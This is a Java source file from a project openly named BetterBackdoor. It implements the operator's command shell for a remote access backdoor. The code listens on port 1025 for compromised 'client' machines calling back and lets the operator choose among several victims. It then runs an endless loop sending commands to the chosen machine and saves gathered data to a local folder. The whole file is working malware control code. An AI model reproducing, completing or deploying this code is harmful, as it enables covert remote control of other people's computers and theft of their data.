package com.thatcherdev.betterbackdoor.shell;

import com.thatcherdev.betterbackdoor.BetterBackdoor;

import java.io.File;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class Shell {

	private static Socket socket;
	public static ObjectInputStream in;
	public static ObjectOutputStream out;
	public static ArrayList<Socket> connectedMachines = new ArrayList<>();

	/**
	 * Starts shell to control backdoor.
	 * <p>
	 * Creates server on port 1025 for client to connect to. Runs {@link Connector#start()} to find
	 * all possible clients and prompts user to select client to connect to if their are multiple clients.
	 * Once client has connected, starts an infinite loop that gets command {@code command} from
	 * user and handles it with {@link com.thatcherdev.betterbackdoor.shell.HandleCommand#handle}.
	 */
	public static void start() {
		System.out.println("Searching for clients...\n");
		try {
			ServerSocket serverSocket = new ServerSocket(1025);
			while (connectedMachines.size() == 0) {
				Connector connector = new Connector(serverSocket);
				connector.start();
				Thread.sleep(5000);
				connector.interrupt();
				if (connectedMachines.size() == 0)
					System.out.println("No clients found. Searching again...\n");
			}

			if (connectedMachines.size() == 1)
				socket = connectedMachines.get(0);
			else {
				System.out.println("Select client to connect to:");
				StringBuilder opString = new StringBuilder("op");
				for (int k = 0; k < connectedMachines.size(); k++) {
					System.out.println("[" + k + "] " + connectedMachines.get(k).getInetAddress());
					opString.append(k);
				}
				String option = BetterBackdoor.getInput(opString.toString());
				for (int k = 0; k < connectedMachines.size(); k++)
					if (option.equals(Integer.toString(k)))
						socket = connectedMachines.get(k);
					else
						connectedMachines.get(k).close();
			}
			connectedMachines.clear();

			out = new ObjectOutputStream(socket.getOutputStream());
			in = new ObjectInputStream(socket.getInputStream());
			new File("gathered").mkdir();
			System.out.println("Connection has been established to " + socket.getInetAddress());
			System.out.println("Enter 'help' for a list of available commands");
			while (true)
				HandleCommand.handle(BetterBackdoor.getInput(""));
		} catch (Exception e) {
			if (e.getMessage().equals("String index out of range: -1")
					|| e.getMessage().equals("begin 0, end -1, length 0"))
				BetterBackdoor.error("The victim's computer has disconnected");
			else
				BetterBackdoor.error(e.getMessage());
		} finally {
			try {
				if (socket != null)
					socket.close();
				if (in != null)
					in.close();
				if (out != null)
					out.close();
			} catch (Exception ignored) {
			}
		}
	}
}

class Connector extends Thread {

	private ServerSocket serverSocket = null;

	public Connector(ServerSocket serverSocket) {
		this.serverSocket = serverSocket;
	}

	/**
	 * Attempts to accept connections to {@link Connector#serverSocket} and add the produced sockets to
	 * {@link com.thatcherdev.betterbackdoor.shell.Shell#connectedMachines}.
	 */
	public void run() {
		while (true) {
			try {
				Socket socket = serverSocket.accept();
				Shell.connectedMachines.add(socket);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}